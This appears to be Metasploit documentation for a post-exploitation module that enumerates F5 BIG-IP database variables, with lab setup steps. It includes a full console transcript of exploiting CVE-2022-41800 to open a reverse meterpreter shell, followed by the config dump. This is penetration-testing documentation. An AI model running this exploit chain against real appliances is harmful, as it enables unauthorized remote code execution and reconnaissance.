## Vulnerable Application

The application is F5 Big-IP, and I don't think the versions matters but I
tested on version 17.0.0.1. It can be downloaded as a VMWare image for free
(you have to create an account) from https://downloads.f5.com. You can register
for a free 30-day trial if you like, but it's not required to test this.

Boot the VM and set an admin password by logging in with the default credentials
(admin / admin). You'll need that password.

## Verification Steps

1. Install the application
2. Start `msfconsole`
3. Do: Get any session somehow (`exploit/linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800` works well on 17.0.0.1 and earlier, or just use `msfvenom`)
4. Do: `use post/linux/gather/f5_enum_db_variables`
5. Do `set SESSION <sessionid>`
6. Do: `run`
7. You should get the info

## Options

n/a

## Scenarios

### F5 Big-IP 17.0.0.1 with a root session

First, get a non-root session however you can. I used the rpmspec vuln:

```
msf6 > use exploit/linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800
[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set HttpPassword mybigtestpassword
HttpPassword => iagotestbigip
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set RHOST 10.0.0.162
RHOST => 10.0.0.162
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set LHOST 10.0.0.179
LHOST => 10.0.0.179
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > exploit
[*] Started reverse TCP handler on 10.0.0.179:4444 
[*] Sending stage (40168 bytes) to 10.0.0.162
[+] Deleted /var/config/rest/node/tmp/708677fa-5b30-43e6-9ce3-d84046e9f6e9.spec
[+] Deleted /var/config/rest/node/tmp/RPMS/noarch/yE15kZeAwp-1.6.1-7.4.4.noarch.rpm
[*] Meterpreter session 1 opened (10.0.0.179:4444 -> 10.0.0.162:36124) at 2022-11-14 16:12:04 -0800

meterpreter > bg
```

Then just use the module, set the SESSION, and run it:

```
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > use post/linux/gather/f5_enum_db_variables                                       
msf6 post(linux/gather/f5_enum_db_variables) > set VERBOSE true                                                                                    
VERBOSE => true                                       
msf6 post(linux/gather/f5_enum_db_variables) > set SESSION 1                                                                                       
SESSION => 1                                       
msf6 post(linux/gather/f5_enum_db_variables) > run
                                                                         
[*] Fetching db variables (this takes a bit)...
[+] cluster.mgmtipaddr => ::                   
[+] clustered.environment => false              
[+] configsync.localconfigtime => 1668534439
[+] dhclient.mgmt => enable                         
[+] dns.domainname => ad.example.org        
[+] dns.nameservers => 10.0.0.1
[+] asm.risk_engine.salt.restart => 0
[+] failover.usetty01 => disable
[+] gtm.coredump => enable
[+] antifraud.encryptionfieldprefix => __
[+] license.maxcores => 2
[+] license.operational => true
[...]
```
